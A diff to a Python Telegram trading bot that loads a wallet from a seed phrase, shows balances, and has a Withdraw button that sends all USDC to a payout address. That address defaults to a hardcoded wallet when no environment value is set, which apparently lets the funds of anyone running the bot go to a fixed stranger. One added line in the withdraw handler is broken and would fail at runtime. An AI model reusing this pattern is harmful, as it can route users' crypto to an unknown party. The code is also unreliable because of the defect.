@@ -25,11 +25,15 @@ PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232
 
 def get_vault():
     seed = os.getenv("WALLET_SEED")
-    if not seed: raise ValueError("❌ WALLET_SEED missing!")
+    if not seed:
+        print("❌ WALLET_SEED missing!")
+        return None
     try:
         if len(seed) == 64 or seed.startswith("0x"): return Account.from_key(seed)
         return Account.from_mnemonic(seed, account_path="m/44'/60'/0'/0/0")
-    except: return None
+    except Exception as e:
+        print(f"Error loading wallet: {e}")
+        return None
 
 vault = get_vault()
 usdc_contract = w3.eth.contract(address=w3.to_checksum_address(USDC_ADDRESS), abi=ERC20_ABI)
@@ -43,6 +47,7 @@ async def market_simulation_1ms(asset):
 
 async def sign_transaction_async(stake_usdc):
     """CPU Task: Pre-signs tx to eliminate broadcast lag."""
+    # Use to_thread to keep the event loop from freezing during Web3 calls
     nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
     gas_price = await asyncio.to_thread(lambda: int(w3.eth.gas_price * 1.5))
     
@@ -107,7 +112,13 @@ async def autopilot_engine(chat_id, context):
 
 # --- 4. UI HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
+    if not vault:
+        return await update.message.reply_text("❌ Wallet Configuration Failed. Check WALLET_SEED.")
+
+    # Fetching balance in thread to prevent start message lag
+    raw_bal = await asyncio.to_thread(w3.eth.get_balance, vault.address)
+    pol_bal = w3.from_wei(raw_bal, 'ether')
+    
     keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🤖 AUTO MODE']]
     welcome = (
         f"🕴️ **Pocket Robot v3 (Elite Edition)**\n"
@@ -134,8 +145,10 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⚙️ **Configure Stake Amount:**", reply_markup=InlineKeyboardMarkup(kb))
 
     elif text == '💰 Wallet':
-        pol_bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
-        usdc_bal = Decimal(usdc_contract.functions.balanceOf(vault.address).call()) / 10**6
+        raw_pol = await asyncio.to_thread(w3.eth.get_balance, vault.address)
+        pol_bal = w3.from_wei(raw_pol, 'ether')
+        usdc_bal = await asyncio.to_thread(lambda: usdc_contract.functions.balanceOf(vault.address).call() / 10**6)
+        
         wallet_msg = (
             f"💳 **Vault Status**\n"
             f"━━━━━━━━━━━━━━\n"
@@ -146,12 +159,14 @@ async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(wallet_msg, parse_mode='Markdown')
 
     elif text == '📤 Withdraw':
-        bal = usdc_contract.functions.balanceOf(vault.address).call()
+        bal = await asyncio.to_thread(usdc_contract.functions.balanceOf, vault.address).call()
         if bal > 0:
+            nonce = await asyncio.to_thread(w3.eth.get_transaction_count, vault.address)
             tx = usdc_contract.functions.transfer(PAYOUT_ADDRESS, bal).build_transaction({
-                'chainId': 137, 'gas': 65000, 'gasPrice': w3.eth.gas_price, 'nonce': w3.eth.get_transaction_count(vault.address)
+                'chainId': 137, 'gas': 65000, 'gasPrice': w3.eth.gas_price, 'nonce': nonce
             })
-            w3.eth.send_raw_transaction(w3.eth.account.sign_transaction(tx, vault.key).raw_transaction)
+            signed = w3.eth.account.sign_transaction(tx, vault.key)
+            await asyncio.to_thread(w3.eth.send_raw_transaction, signed.raw_transaction)
             await update.message.reply_text(f"📤 Successfully moved `{bal/10**6:.2f}` USDC.")
         else:
             await update.message.reply_text("❌ No USDC balance.")
@@ -178,12 +193,13 @@ async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
 if __name__ == "__main__":
     TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-    app = ApplicationBuilder().token(TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CallbackQueryHandler(handle_interaction))
-    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
-    print("🤖 APEX Online...")
-    app.run_polling(drop_pending_updates=True)
+    if TOKEN:
+        app = ApplicationBuilder().token(TOKEN).build()
+        app.add_handler(CommandHandler("start", start))
+        app.add_handler(CallbackQueryHandler(handle_interaction))
+        app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
+        print("🤖 APEX Online...")
+        app.run_polling(drop_pending_updates=True)
 
 
 
